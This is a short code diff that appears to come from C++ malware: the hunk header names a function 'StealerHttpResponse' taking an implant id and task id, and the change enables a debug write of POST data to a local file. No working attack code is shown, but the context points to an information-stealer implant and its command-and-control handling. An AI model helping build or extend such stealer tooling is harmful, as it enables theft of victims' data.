@@ -387,8 +387,8 @@ std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, js
 
 
 
-    //std::ofstream file("newbad.txt");
-    //file << postdata;
+    std::ofstream file("sitawareplswork.txt");
+    file << postdata;
 
     //LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
